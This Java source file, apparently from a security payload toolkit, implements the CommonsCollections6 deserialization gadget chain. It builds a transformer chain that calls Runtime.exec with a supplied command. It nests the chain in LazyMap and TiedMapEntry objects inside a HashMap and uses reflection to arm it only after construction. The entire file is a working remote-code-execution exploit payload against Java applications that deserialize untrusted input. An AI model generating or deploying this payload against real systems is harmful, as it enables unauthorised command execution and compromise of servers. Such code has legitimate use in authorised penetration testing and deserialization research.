package com.xyuxu.javasec.core.payload.gadgets;

import com.xyuxu.javasec.core.generator.TemplatesBytecodeGenerator;
import com.xyuxu.javasec.utils.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class CommonsCollections6 implements ObjectPayload {

    @Override
    public Object getObject(final String command) throws Exception {

        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{command}),
                new ConstantTransformer(1)
        };

        final Transformer fakeChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});


        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, fakeChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        Map outerMap = new HashMap();
        outerMap.put(entry, "bar");
        lazyMap.remove("foo");
        Reflections.setFieldValue(fakeChain, "iTransformers", transformers);
        return outerMap;
    }

}